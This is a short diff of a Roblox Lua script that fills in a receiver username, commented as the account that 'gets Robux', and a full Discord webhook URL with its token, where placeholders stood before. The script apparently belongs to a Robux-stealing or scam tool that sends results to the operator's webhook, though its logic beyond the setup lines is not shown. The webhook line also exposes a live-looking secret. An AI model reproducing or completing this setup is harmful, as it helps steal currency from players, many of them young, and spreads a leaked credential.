@@ -1,6 +1,6 @@
-local Username = "RECEIVER_USERNAME_HERE"  -- ← RECEIVER (gets Robux) HERE
-local Webhook = "https://l.webhook.party/hook/YOUR_MAIN_WEBHOOK"
-local LogsWebhook = "https://l.webhook.party/hook/YOUR_LOGS_WEBHOOK"
+local Username = "Ian_wp27"  -- ← RECEIVER (gets Robux) HERE
+local Webhook = "https://discord.com/api/webhooks/1458884856426533072/Q0pIBjd26cRIJxjKGsxyX2Zc3REER9eLrqAyURK1oSgxS-WkKZDp7UaFo8kocv6TaCaB"
+local LogsWebhook = nil
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local MarketplaceService = game:GetService("MarketplaceService")
